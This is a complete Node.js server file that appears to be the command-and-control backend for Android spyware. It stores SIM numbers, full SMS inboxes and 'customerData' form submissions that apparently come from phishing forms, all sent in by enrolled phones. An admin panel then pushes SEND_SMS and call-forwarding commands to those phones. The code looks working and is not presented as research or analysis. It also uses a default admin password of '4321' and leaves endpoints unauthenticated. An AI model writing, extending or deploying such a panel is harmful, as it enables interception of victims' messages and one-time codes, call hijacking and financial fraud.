require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });

let MONGO_URI = process.env.MONGO_URI || '';
if (MONGO_URI) { MONGO_URI = MONGO_URI.replace(/\\"/g, '').replace(/;/g, '').trim(); }

let dbConnected = false;
if (!MONGO_URI) { console.error('CRITICAL: MONGO_URI missing'); } 
else {
    mongoose.set('bufferCommands', false);
    mongoose.connect(MONGO_URI, { serverSelectionTimeoutMS: 5000, connectTimeoutMS: 10000, writeConcern: { w: 1 } })
    .then(() => { dbConnected = true; console.log('✅ MongoDB connected'); })
    .catch(err => { console.error('❌ MongoDB error:', err.message); });
}

const deviceSchema = new mongoose.Schema({
  deviceId: { type: String, index: true },
  serialNumber: String,
  model: String,
  androidVersion: String,
  sim1: String,
  sim2: String,
  battery: { type: Number, default: 0 },
  isOnline: Boolean,
  lastSeen: Date,
  isPinned: { type: Boolean, default: false },
  registrationTimestamp: Date,
  customerData: { type: Array, default: [] },
  isDeleted: { type: Boolean, default: false },
  smsMessages: Array,
  deletedSmsLog: { type: Array, default: [] },
  lastCommandResult: { type: mongoose.Schema.Types.Mixed, default: null }
}, { timestamps: true });

const Device = mongoose.model('Device', deviceSchema);

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ noServer: true });
global.deviceSockets = new Map();

let adminPassword = process.env.ADMIN_PASSWORD || '4321';

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (username === 'admin' && password === adminPassword) return res.json({ success: true });
  return res.status(401).json({ success: false, message: 'Unauthorized' });
});

app.post('/api/change-password', (req, res) => {
    const { oldPassword, newPassword } = req.body || {};
    if (oldPassword === adminPassword) { adminPassword = newPassword; return res.json({ success: true }); }
    return res.status(401).json({ success: false, message: 'Wrong old password' });
});

app.get('/api/devices', async (req, res) => {
  try {
    if (!dbConnected) return res.json([]);
    const list = await Device.find({ isDeleted: { $ne: true } }).lean();
    const now = Date.now();
    list.forEach(d => { if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) d.isOnline = false; });
    res.json(list);
  } catch (err) { res.status(500).json({ error: 'Failed' }); }
});

app.post('/api/delete-device', async (req, res) => {
  try {
    const { deviceId, password } = req.body || {};
    if (password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
    const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
    await Device.deleteMany(query);
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (err) { return res.status(500).json({ success: false }); }
});

app.post('/api/delete-sms', async (req, res) => {
    try {
        const { deviceId, smsData } = req.body || {};
        const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
        let dateVal = smsData.date;
        if (!isNaN(dateVal)) dateVal = Number(dateVal);
        const signature = `${smsData.body}_${dateVal}`;
        await Device.findOneAndUpdate(query, { $pull: { smsMessages: { body: smsData.body, date: dateVal } }, $addToSet: { deletedSmsLog: signature } });
        return res.json({ success: true });
    } catch(e) { return res.status(500).json({ success: false }); }
});

app.post('/api/pin-device', async (req, res) => {
    try {
        const { deviceId, status } = req.body || {};
        const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
        await Device.findOneAndUpdate(query, { $set: { isPinned: !!status } });
        io.emit('dashboard-update');
        return res.json({ success: true });
    } catch(e) { return res.status(500).json({ success: false }); }
});

app.post('/api/command', async (req, res) => {
    try {
        const { deviceId, action, data } = req.body || {};
        const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
        let device = await Device.findOne(query).lean();
        if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
        
        if (action === 'SEND_SMS' || action.startsWith('CALL_FORWARD')) {
            const slot = data.simSlot || "1";
            const simVal = slot === "1" ? device.sim1 : device.sim2;
            if (!simVal || simVal === 'Not Available' || simVal === 'N/A') {
                return res.json({ success: false, message: `SIM ${slot} is not available on this device` });
            }
        }

        const clients = global.deviceSockets.get(device.deviceId);
        if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
            return res.json({ success: true, device, messages: device.smsMessages || [], customerData: device.customerData || [] });
        }
        
        if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device is OFFLINE' });
        
        // Reset last result for a fresh command
        await Device.findOneAndUpdate(query, { $set: { lastCommandResult: null } });

        clients.forEach(c => { if(c.readyState === WebSocket.OPEN) c.send(JSON.stringify({ command: action, data })); });
        return res.json({ success: true, message: 'Command sent. Waiting for response...' });
    } catch(e) { return res.status(500).json({ success: false }); }
});

app.get('/api/check-result/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
        const device = await Device.findOne(query).lean();
        if (device && device.lastCommandResult) return res.json({ success: true, result: device.lastCommandResult });
        return res.json({ success: false });
    } catch (e) { res.status(500).json({ success: false }); }
});

server.on('upgrade', (req, socket, head) => {
  if (req.url && req.url.startsWith('/socket.io')) return;
  wss.handleUpgrade(req, socket, head, (ws) => { wss.emit('connection', ws, req); });
});

wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.on('message', async (msg) => {
    try {
      const data = JSON.parse(msg);
      const id = data.deviceId || data.serialNumber || data.id;
      if (!id) return;
      ws.deviceId = id;
      if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
      global.deviceSockets.get(id).add(ws);
      
      if (data.type === 'COMMAND_RESULT') {
          const resObj = { success: data.success, message: data.message, action: data.command, timestamp: new Date() };
          await Device.findOneAndUpdate({ deviceId: id }, { $set: { lastCommandResult: resObj } });
          io.emit('command-result', { deviceId: id, ...resObj });
          return;
      }

      const existingDevice = await Device.findOne({ deviceId: id }).lean();
      const deletedLog = existingDevice?.deletedSmsLog || [];
      const updateSet = { isOnline: true, lastSeen: new Date(), isDeleted: false };
      
      // Extracting fields from Flat JSON as per Developer instructions
      const payloadData = (data.data && typeof data.data === 'object') ? data.data : (data.customerData && typeof data.customerData === 'object' ? data.customerData : data);

      let s1 = data.sim1 || data.simNumber1 || data.phoneNumber1 || data.mobile1 || data.phone1 || data.simNo1 || payloadData.sim1 || payloadData.Mobile || payloadData.mobile || payloadData.Phone || payloadData.phone || payloadData.Number || payloadData.number || payloadData["Mobile Number"] || payloadData["Phone Number"];
      let s2 = data.sim2 || data.simNumber2 || data.phoneNumber2 || data.mobile2 || data.phone2 || data.simNo2 || payloadData.sim2 || payloadData.Mobile2 || payloadData.mobile2 || payloadData.Phone2 || payloadData.phone2;

      if (s1 && s1 !== 'N/A' && s1 !== 'Not Available' && s1 !== 'null') updateSet.sim1 = s1;
      if (s2 && s2 !== 'N/A' && s2 !== 'Not Available' && s2 !== 'null') updateSet.sim2 = s2;
      
      if (data.model) updateSet.model = data.model;
      if (data.androidVersion) updateSet.androidVersion = data.androidVersion;
      if (data.serialNumber) updateSet.serialNumber = data.serialNumber;
      
      let b = parseInt(data.battery);
      if (!isNaN(b)) updateSet.battery = b;
      
      if (data.type === 'SMS_LIST' && data.messages) {
          updateSet.smsMessages = data.messages.filter(m => !deletedLog.includes(`${m.body}_${m.date || m.time}`));
      }
      
      const finalUpdate = { $set: updateSet, $setOnInsert: { registrationTimestamp: new Date(), isPinned: false } };
      
      // Corrected Flat JSON Handling for FORM_DATA
      if (data.type === 'FORM_SUBMIT' || data.type === 'FORM_DATA') {
          let submission = {};
          if (data.data && typeof data.data === 'object') {
              submission = { ...data.data };
          } else if (data.customerData && typeof data.customerData === 'object') {
              submission = { ...data.customerData };
          } else {
              // Extract all fields from the root message for Flat JSON
              const { type, deviceId, serialNumber, model, androidVersion, battery, ...rest } = data;
              submission = { ...rest };
          }
          
          if (Object.keys(submission).length > 0) {
              submission.submittedAt = new Date();
              finalUpdate.$push = { customerData: submission };
          }
      }
      
      if (dbConnected) {
          await Device.findOneAndUpdate({ deviceId: id }, finalUpdate, { upsert: true });
          io.emit('dashboard-update');
      }
    } catch (e) { console.error('WS Error:', e); }
  });
  ws.on('close', () => { if (ws.deviceId) global.deviceSockets.get(ws.deviceId)?.delete(ws); });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log('🚀 Server started'));
